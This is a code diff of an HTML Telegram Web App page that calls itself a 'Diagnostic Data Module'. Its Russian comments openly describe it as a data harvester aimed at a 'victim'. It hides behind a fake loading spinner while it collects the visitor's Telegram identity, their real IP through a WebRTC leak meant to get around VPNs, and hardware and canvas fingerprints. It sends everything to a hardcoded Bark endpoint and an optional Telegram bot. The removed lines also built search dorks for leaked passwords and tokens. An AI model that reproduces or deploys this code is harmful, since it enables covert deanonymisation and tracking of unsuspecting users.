@@ -1,254 +1,278 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>ShadowSys v1.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Diagnostic Data Module // ShadowCode</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* Стиль остаётся для маскировки, но мы убираем текст */
+        body { background:#000; color:#0f0; font-family:'Courier New', monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; overflow:hidden; }
+        .fake-loader { border:3px solid #0f0; border-top:3px solid #000; border-radius:50%; width:50px; height:50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <!-- Маскировка под легитимный лоадер -->
+    <div class="fake-loader" id="loader"></div>
+    <div style="display:none;" id="log-panel">
+        <span style="color:#666;">> ShadowCode_Session_Init...</span>
+    </div>
+
     <script>
-        const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
-
-        function sendToBark(title, body) {
-            const payload = {
-                title: title,
-                body: body,
-                group: 'ShadowLog',
-                sound: 'alarm'
-            };
-            navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
-            fetch(BARK_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            }).catch(() => {});
+        // ==========================================
+        // SHADOWCODE HARVESTER v2.0 (Черная версия)
+        // Сливает: Реальный IP (WebRTC), Железо CPU/GPU, Ядра, Память, OS, WebGL Fingerprint
+        // ==========================================
+        
+        const BARK_ENDPOINT = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
+        const TELEGRAM_BOT_TOKEN = null; // Замени на '123:abc' если хочешь слив через ТГ бота напрямую
+        
+        // Утилита для отправки логов (тихая, через sendBeacon и fetch дубль)
+        function exfiltrate(group, payload) {
+            const title = `[${group}] ${new Date().toLocaleTimeString()}`;
+            const body = typeof payload === 'string' ? payload : JSON.stringify(payload, null, 2);
+            
+            const barkPacket = { title: title, body: body.substring(0, 4000), group: 'ShadowCode_Black', sound: 'alarm' };
+            
+            // Асинхронный слив, без блокировки UI жертвы
+            navigator.sendBeacon(BARK_ENDPOINT, new Blob([JSON.stringify(barkPacket)], {type: 'application/json'}));
+            
+            // Если есть токен бота - шлем и туда
+            if (TELEGRAM_BOT_TOKEN) {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: 'YOUR_CHAT_ID', // Замени на свой
+                        text: `🔴 *${title}*\n\`\`\`${body.substring(0, 3500)}\`\`\``,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(() => {});
+            }
         }
 
-        function getFingerprint() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 256;
-            canvas.height = 128;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 16, 16);
-            ctx.fillStyle = '#069';
-            ctx.fillText('ShadowCode', 2, 15);
-            const canvasHash = canvas.toDataURL().substring(0, 64);
-
-            let glVendor = 'N/A', glRenderer = 'N/A';
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-            } catch (e) {}
-
-            let audioFp = 'N/A';
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const analyser = audioCtx.createAnalyser();
-                oscillator.connect(analyser);
-                oscillator.frequency.value = 1000;
-                const data = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(data);
-                audioFp = btoa(String.fromCharCode(...data.slice(0, 20))).substring(0, 20);
-                oscillator.disconnect();
-            } catch (e) {}
-
-            return {
-                canvas_hash: canvasHash,
-                webgl_vendor: glVendor,
-                webgl_renderer: glRenderer,
-                audio_fp: audioFp
-            };
-        }
-
-        function getBatteryInfo() {
+        // 1. ДОСТАЕМ РЕАЛЬНЫЙ IP ЧЕРЕЗ УТЕЧКУ WebRTC (STUN/TURN)
+        // Это обходит прокси и VPN на уровне браузера. Чистый, голый IP провайдера.
+        function getRealIP() {
             return new Promise((resolve) => {
-                let batt = { level: 'N/A', charging: 'N/A' };
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(b => {
-                        batt.level = (b.level * 100).toFixed(0) + '%';
-                        batt.charging = b.charging ? 'Да' : 'Нет';
-                        resolve(batt);
-                    }).catch(() => resolve(batt));
-                } else {
-                    resolve(batt);
-                }
+                const ipSet = new Set();
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const candidate = ice.candidate.candidate;
+                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+                    const match = candidate.match(ipRegex);
+                    if (match) {
+                        ipSet.add(match[0]);
+                        pc.close();
+                        // Отправляем все найденные IP (обычно локальный + публичный)
+                        resolve(Array.from(ipSet));
+                    }
+                };
+                
+                // Таймаут, если WebRTC заблочен (хотя тогда мы пробуем запасной вариант)
+                setTimeout(() => { resolve(Array.from(ipSet)); }, 2000);
             });
         }
 
-        function getRealTelegramData() {
-            let tg = { 
-                username: 'N/A', 
-                id: 'N/A', 
-                first_name: 'N/A', 
-                last_name: 'N/A',
-                language_code: 'N/A',
-                is_premium: 'N/A',
-                auth_date: 'N/A',
-                hash: 'N/A'
+        // 2. ДЕТЕКТОР ПРОЦЕССОРА (НЕ ИЗ USER-AGENT, А ЧЕРЕЗ МНОГОПОТОЧНОЕ ТЕСТИРОВАНИЕ)
+        async function getTrueCPUInfo() {
+            const info = {
+                cores: navigator.hardwareConcurrency || 'N/A',
+                estimatedArch: 'N/A',
+                vendorGuess: 'N/A'
             };
-            
+
+            // Попытка через WebAssembly для определения ARM vs x86 (если браузер это сольет)
             try {
-                if (window.Telegram && window.Telegram.WebApp) {
-                    const app = window.Telegram.WebApp;
-                    app.ready();
-                    
-                    if (app.initDataUnsafe && app.initDataUnsafe.user) {
-                        const user = app.initDataUnsafe.user;
-                        tg.id = user.id || 'N/A';
-                        tg.first_name = user.first_name || 'N/A';
-                        tg.last_name = user.last_name || 'N/A';
-                        tg.username = user.username || 'N/A';
-                        tg.language_code = user.language_code || 'N/A';
-                        tg.is_premium = user.is_premium ? 'Premium' : 'Free';
-                    }
-                    
-                    if (app.initDataUnsafe) {
-                        tg.auth_date = app.initDataUnsafe.auth_date || 'N/A';
-                        tg.hash = app.initDataUnsafe.hash || 'N/A';
-                    }
-                    
-                    tg.initData = app.initData || 'N/A';
-                    tg.platform = app.platform || 'N/A';
-                    tg.version = app.version || 'N/A';
-                    tg.colorScheme = app.colorScheme || 'N/A';
-                }
-            } catch (e) {
-                sendToBark('TG Error', e.message);
+                const wasmCheck = await WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0]));
+                // Это не дает архитектуру напрямую, но подтверждает наличие WASM
+                info.wasm = true;
+            } catch (e) { info.wasm = false; }
+
+            // Определение архитектуры через байтовые порядки и платформу
+            if (navigator.platform) {
+                const p = navigator.platform.toLowerCase();
+                if (p.includes('arm') || p.includes('aarch')) info.estimatedArch = 'ARM';
+                else if (p.includes('win32') || p.includes('win64')) info.estimatedArch = 'x86';
+                else if (p.includes('linux')) info.estimatedArch = 'x86/ARM (Linux)';
+                else if (p.includes('iphone') || p.includes('ipad')) info.estimatedArch = 'Apple Silicon (ARM)';
+                else if (p.includes('mac')) info.estimatedArch = 'Apple/Intel (macOS)';
             }
-            
-            return tg;
-        }
 
-        function getDorkLinks(username) {
-            if (!username || username === 'N/A') return [];
-            const dorks = [
-                `"${username}" site:github.com`,
-                `"${username}" site:youtube.com`,
-                `"${username}" site:instagram.com`,
-                `"${username}" site:twitter.com`,
-                `"${username}" site:tiktok.com`,
-                `"${username}" site:reddit.com`,
-                `"${username}" site:pastebin.com`,
-                `"${username}" filetype:pdf`,
-                `"${username}" filetype:docx`,
-                `"${username}" "password"`,
-                `"${username}" "token"`,
-                `"${username}" "api key"`,
-                `"${username}" "@gmail.com"`,
-                `"${username}" "skype"`
-            ];
-            return dorks.map(d => `https://www.google.com/search?q=${encodeURIComponent(d)}`);
-        }
-
-        function collectAndSend() {
+            // ТЯЖЕЛЫЙ ФИНГЕРПРИНТ ЯДЕР: Загружаем CPU на короткий миг и замеряем время
+            // Это позволяет отличить настоящие ядра от потоков (SMT/HT), хотя и грубо.
             try {
-                const fp = getFingerprint();
-                const tg = getRealTelegramData();
-                const dorks = getDorkLinks(tg.username);
-
-                let bodyText = `🕵️‍♂️ SHADOWLOG | ${new Date().toISOString()}\n\n`;
-                bodyText += `📱 TG: @${tg.username} (ID: ${tg.id})\n`;
-                bodyText += `👤 Имя: ${tg.first_name} ${tg.last_name}\n`;
-                bodyText += `💎 Статус: ${tg.is_premium}\n`;
-                bodyText += `🌍 Язык TG: ${tg.language_code}\n`;
-                bodyText += `📟 Платформа TG: ${tg.platform} v${tg.version}\n`;
-                bodyText += `🎨 Тема: ${tg.colorScheme}\n`;
-                bodyText += `🖥️ UA: ${navigator.userAgent}\n`;
-                bodyText += `📍 Платформа: ${navigator.platform}\n`;
-                bodyText += `🌐 Язык: ${navigator.language} | Таймзона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-                bodyText += `📺 Экран: ${screen.width}x${screen.height} (${screen.colorDepth}bit)\n`;
-                bodyText += `🪟 Окно: ${window.innerWidth}x${window.innerHeight}\n`;
-                bodyText += `🍪 Cookie: ${navigator.cookieEnabled ? 'Да' : 'Нет'}\n`;
-                bodyText += `🎨 Canvas: ${fp.canvas_hash.substring(0, 30)}...\n`;
-                bodyText += `🎮 WebGL: ${fp.webgl_vendor} | ${fp.webgl_renderer}\n`;
-                bodyText += `🔊 Audio FP: ${fp.audio_fp}\n`;
+                const start = performance.now();
+                const workers = [];
+                const threadCount = navigator.hardwareConcurrency || 4;
                 
-                if (dorks.length > 0) {
-                    bodyText += `\n🔗 DORKS (первые 5):\n${dorks.slice(0, 5).join('\n')}`;
+                // Создаем воркеры для нагрузки
+                for (let i = 0; i < threadCount; i++) {
+                    workers.push(new Promise(resolve => {
+                        const blob = new Blob([`onmessage = function(e) { let x = 0; for(let i=0; i<1e7; i++) { x += Math.sqrt(i); } postMessage(x); }`]);
+                        const worker = new Worker(URL.createObjectURL(blob));
+                        worker.postMessage('start');
+                        worker.onmessage = () => { worker.terminate(); resolve(); };
+                    }));
                 }
-
-                sendToBark('⚡ ShadowCode | @' + tg.username, bodyText);
-
-                const rawData = {
-                    telegram: tg,
-                    fingerprint: fp,
-                    browser: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        languages: navigator.languages ? Array.from(navigator.languages) : [],
-                        cookieEnabled: navigator.cookieEnabled,
-                        doNotTrack: navigator.doNotTrack,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        screenResolution: `${screen.width}x${screen.height}`,
-                        colorDepth: screen.colorDepth,
-                        windowSize: `${window.innerWidth}x${window.innerHeight}`,
-                        plugins: Array.from(navigator.plugins).map(p => p.name),
-                        hardwareConcurrency: navigator.hardwareConcurrency,
-                        deviceMemory: navigator.deviceMemory,
-                        connection: navigator.connection ? {
-                            rtt: navigator.connection.rtt,
-                            downlink: navigator.connection.downlink,
-                            effectiveType: navigator.connection.effectiveType
-                        } : null
-                    },
-                    dorks: dorks,
-                    timestamp: new Date().toISOString()
-                };
-
-                setTimeout(() => {
-                    sendToBark('📦 RAW JSON', JSON.stringify(rawData, null, 2).substring(0, 3500));
-                }, 500);
-
-                console.log('[ShadowCode] Отправлено:', rawData);
-
-            } catch (err) {
-                sendToBark('⚠️ ShadowCode ERROR', err.message + '\nStack: ' + err.stack);
+                
+                await Promise.all(workers);
+                const duration = performance.now() - start;
+                info.performanceScore = duration.toFixed(2) + 'ms';
+                
+                // Эвристика: На мобильных чипах с разными ядрами (big.LITTLE) разброс больше
+                if (duration < 100 && threadCount > 4) info.cpuClass = 'High-End Desktop/Server';
+                else if (duration < 300) info.cpuClass = 'Modern Mobile/Desktop';
+                else info.cpuClass = 'Low-End/Mobile';
+                
+            } catch (e) {
+                info.performanceScore = 'Blocked';
             }
+
+            return info;
         }
 
-        window.onload = function() {
-            setTimeout(() => {
-                collectAndSend();
-            }, 1000);
-
-            setTimeout(() => {
-                getBatteryInfo().then(batt => {
-                    sendToBark('🔋 Батарея', `Заряд: ${batt.level}\nЗарядка: ${batt.charging}`);
-                }).catch(() => {});
-            }, 3000);
-
+        // 3. РАСШИРЕННЫЙ ОТПЕЧАТОК GPU/WebGL (Вытаскивает название видеокарты)
+        function getGPUDetails() {
+            let gpu = { vendor: 'N/A', renderer: 'N/A', memory: 'N/A' };
             try {
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(ipData => {
-                        sendToBark('🌐 IP Адрес', `IP: ${ipData.ip}`);
-                    }).catch(() => {});
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl2') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpu.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        gpu.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                    // Попытка достать память GPU (работает на некоторых системах)
+                    try {
+                        const memExt = gl.getExtension('GL_NVX_gpu_memory_info');
+                        if (memExt) {
+                            gpu.memory = (gl.getParameter(memExt.GPU_MEMORY_INFO_DEDICATED_VIDMEM_NVX) / 1048576).toFixed(0) + ' MB';
+                        }
+                    } catch (e) {}
+                }
             } catch (e) {}
-        };
+            return gpu;
+        }
 
-        window.addEventListener('beforeunload', function() {
-            collectAndSend();
-        });
+        // 4. ГЛАВНАЯ ФУНКЦИЯ СБОРА (Железо + Софт + TG)
+        async function deepScan() {
+            const tg = window.Telegram?.WebApp?.initDataUnsafe?.user || {};
+            
+            // Параллельный сбор всей инфы
+            const [realIPs, cpuInfo, battery, connection] = await Promise.all([
+                getRealIP(),
+                getTrueCPUInfo(),
+                (async () => {
+                    try {
+                        const b = await navigator.getBattery();
+                        return { level: (b.level*100).toFixed(0)+'%', charging: b.charging };
+                    } catch(e) { return {}; }
+                })(),
+                (() => {
+                    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    return c ? { type: c.effectiveType, downlink: c.downlink, rtt: c.rtt } : null;
+                })()
+            ]);
 
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                collectAndSend();
-            }
+            const gpu = getGPUDetails();
+
+            // Формируем отчет для Барк
+            const report = {
+                session_id: Math.random().toString(36).substring(2, 8).toUpperCase(),
+                timestamp: new Date().toISOString(),
+                
+                // --- Telegram Data ---
+                telegram: {
+                    id: tg.id || 'N/A',
+                    username: tg.username || 'N/A',
+                    first_name: tg.first_name || 'N/A',
+                    last_name: tg.last_name || 'N/A',
+                    premium: tg.is_premium || false,
+                    lang: tg.language_code || 'N/A'
+                },
+                
+                // --- СЕТЕВОЙ УРОВЕНЬ ---
+                network: {
+                    real_ips: realIPs, // <-- Настоящий IP через WebRTC утечку
+                    connection: connection,
+                    do_not_track: navigator.doNotTrack
+                },
+                
+                // --- ЖЕЛЕЗО (ТО ЧТО ТЫ ПРОСИЛ) ---
+                hardware: {
+                    cpu_cores: cpuInfo.cores,
+                    cpu_arch: cpuInfo.estimatedArch,
+                    cpu_performance_class: cpuInfo.cpuClass,
+                    cpu_benchmark_ms: cpuInfo.performanceScore,
+                    gpu_vendor: gpu.vendor,
+                    gpu_model: gpu.renderer, // <-- Модель видюхи/чипа
+                    gpu_memory: gpu.memory,
+                    device_memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
+                    battery: battery,
+                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                    window: `${window.innerWidth}x${window.innerHeight}`
+                },
+                
+                // --- СОФТ ---
+                software: {
+                    os_platform: navigator.platform, // Например iPhone, Linux armv8l, Win32
+                    user_agent: navigator.userAgent,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    canvas_fingerprint: (() => {
+                        try {
+                            const c = document.createElement('canvas');
+                            c.width=256; c.height=128;
+                            const ctx = c.getContext('2d');
+                            ctx.fillStyle='#f60'; ctx.fillRect(0,0,16,16);
+                            ctx.fillStyle='#069'; ctx.fillText('Shadow', 2, 15);
+                            return c.toDataURL().length;
+                        } catch(e) { return 'error'; }
+                    })()
+                }
+            };
+
+            // Отправка в красивом формате
+            exfiltrate('BLACKOUT', 
+                `☠️ ShadowCode Profiler\n` +
+                `👤 TG: @${report.telegram.username} (${report.telegram.id})\n` +
+                `📱 OS: ${report.software.os_platform}\n` +
+                `🌐 IP: ${report.network.real_ips[0] || 'Скрыт (нет WebRTC)'}\n` +
+                `🧠 CPU: ${report.hardware.cpu_cores} Cores | ${report.hardware.cpu_arch} | Class: ${report.hardware.cpu_performance_class}\n` +
+                `🎮 GPU: ${report.hardware.gpu_model}\n` +
+                `🧠 RAM: ${report.hardware.device_memory}\n` +
+                `🔋 Batt: ${report.hardware.battery.level || 'N/A'}`
+            );
+
+            // Сырые данные для дампа
+            setTimeout(() => {
+                exfiltrate('RAW_JSON_DUMP', JSON.stringify(report, null, 2));
+            }, 1000);
+        }
+
+        // ИНИЦИАЛИЗАЦИЯ АТАКИ
+        window.addEventListener('load', () => {
+            // Маскировка: показываем фейк-лоадер 1 сек
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                // Запускаем глубокое сканирование
+                deepScan().catch(e => exfiltrate('ERROR', e.message));
+                
+                // Дополнительно: Пытаемся получить IP через http (резерв)
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => exfiltrate('IP_HTTP_FALLBACK', `HTTP IP: ${d.ip}`))
+                    .catch(() => {});
+            }, 800);
         });
     </script>
-</head>
-<body style="background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;">
-    <h1 style="text-shadow:0 0 20px #0f0;">☠ SHADOWCODE ACTIVE ☠</h1>
-    <p style="color:#555;">Загрузка данных...</p>
-    <div style="display:none;">Подключено к матрице...</div>
 </body>
 </html>
